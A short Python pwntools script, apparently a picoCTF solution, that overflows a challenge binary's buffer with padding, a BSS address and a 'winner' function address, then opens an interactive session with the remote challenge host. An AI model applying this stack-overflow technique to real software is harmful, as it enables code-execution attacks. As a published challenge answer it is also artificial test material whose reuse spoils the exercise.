from pwn import *

p = remote('foggy-cliff.picoctf.net', 64519)
e = ELF('./vuln')

winner_addr = 0x80492b6
padding = b'A' * 20
payload = padding + p32(e.bss()) + p32(winner_addr)
p.recvuntil(b':\n')
p.sendline(payload + b' name')

p.interactive()
